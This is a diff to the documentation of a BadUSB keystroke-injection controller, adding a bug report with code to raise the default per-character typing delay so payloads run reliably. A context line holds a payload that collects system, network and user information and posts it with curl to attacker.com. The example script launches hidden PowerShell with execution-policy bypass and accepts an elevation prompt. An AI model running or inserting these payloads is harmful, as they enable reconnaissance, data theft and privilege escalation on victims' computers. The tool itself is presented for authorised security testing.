@@ -406,7 +406,101 @@ DELAY 500
 STRING cmd /c "systeminfo > %TEMP%\sysinfo.txt & ipconfig /all >> %TEMP%\sysinfo.txt & net user >> %TEMP%\sysinfo.txt & type %TEMP%\sysinfo.txt | curl -X POST -d @- http://attacker.com/collect"
 ENTER
 ```
+### Common issues
 
+Bug: CHAR_DELAY should have a minimum of 30ms to prevent data loss in BadUSB payloads
+Description
+When executing BadUSB payloads through the Keyoes controller, we've discovered that the current default character delay of 10ms (char_delay = 0.01 in the code) causes significant reliability issues. Characters are frequently dropped or misinterpreted during payload execution, especially with longer commands or when targeting systems under load.
+Current Implementation
+In the current code (execute_script() function), we have:
+python# Setăm un delay de bază între caractere pentru scrierea de text
+char_delay = 0.01  # 10ms între caractere
+
+for line in script_lines:
+    # ...
+    if command == "STRING":
+        if len(parts) > 1:
+            # Pentru fiecare caracter, adăugăm un mic delay
+            text = parts[1]
+            for char in text:
+                keyboard_layout.write(char)
+                time.sleep(char_delay)  # Delay între caractere
+The CHAR_DELAY command exists, but there's no warning or minimum value enforcement:
+pythonelif command == "CHAR_DELAY":
+    # Comandă nouă pentru a schimba delay-ul dintre caractere
+    if len(parts) > 1:
+        try:
+            char_delay = float(parts[1]) / 1000.0  # conversia din ms în secunde
+            print(f"Character delay set to {char_delay}s")
+        except ValueError:
+            print(f"Invalid CHAR_DELAY value: {parts[1]}")
+Problem Details
+
+Target systems miss keystrokes during rapid typing sequences
+Special characters and complex commands often fail to register properly
+Payloads fail silently with no indication of character loss
+The web interface doesn't provide guidance on appropriate CHAR_DELAY values
+
+Steps to Reproduce
+
+Upload a complex payload with long STRING commands
+Execute the payload with default CHAR_DELAY (10ms)
+Observe incomplete or failed command execution on target system
+
+Proposed Fix
+
+Increase the default CHAR_DELAY to 30ms minimum:
+
+python# Setăm un delay de bază între caractere pentru scrierea de text
+char_delay = 0.03  # 30ms între caractere (changed from 10ms)
+
+Add validation to enforce a minimum value when users set CHAR_DELAY:
+
+pythonelif command == "CHAR_DELAY":
+    if len(parts) > 1:
+        try:
+            requested_delay = float(parts[1])
+            if requested_delay < 30:
+                print(f"Warning: CHAR_DELAY below 30ms may cause reliability issues")
+                print(f"Automatically adjusting to minimum recommended value (30ms)")
+                requested_delay = 30
+            char_delay = requested_delay / 1000.0  # conversia din ms în secunde
+            print(f"Character delay set to {char_delay}s")
+        except ValueError:
+            print(f"Invalid CHAR_DELAY value: {parts[1]}")
+
+Update the web interface to include guidance (in the terminal-window section):
+
+html<div class="terminal-editor">
+    <textarea id="script" placeholder="Type here ... Use CHAR_DELAY 30 or higher for reliable payload execution"></textarea>
+    <div class="delay-hint">Tip: Add 'CHAR_DELAY 30' at the start of your script for reliable execution</div>
+</div>
+
+Add CSS for the hint:
+
+css.delay-hint {
+    color: #0abab5;
+    font-size: 12px;
+    padding: 5px;
+    border-top: 1px dashed var(--kali-border);
+    margin-top: 5px;
+}
+Example Script with Fix
+REM Reliable payload with proper delay
+CHAR_DELAY 30
+STRING powershell -NoP -NonI -W Hidden -Exec Bypass -Command "Start-Process cmd -Verb RunAs"
+DELAY 1000
+STRING Y
+ENTER
+Impact
+
+More reliable payload execution across all target systems
+Fewer failed attacks due to dropped keystrokes
+Better user experience with clearer guidance
+No significant performance impact (20ms additional delay per character is negligible compared to failed execution)
+
+Priority
+Medium-High: This affects the core functionality of the BadUSB controller
 ## Best Practices for Operational Security
 
 When utilizing this controller for legitimate security testing:
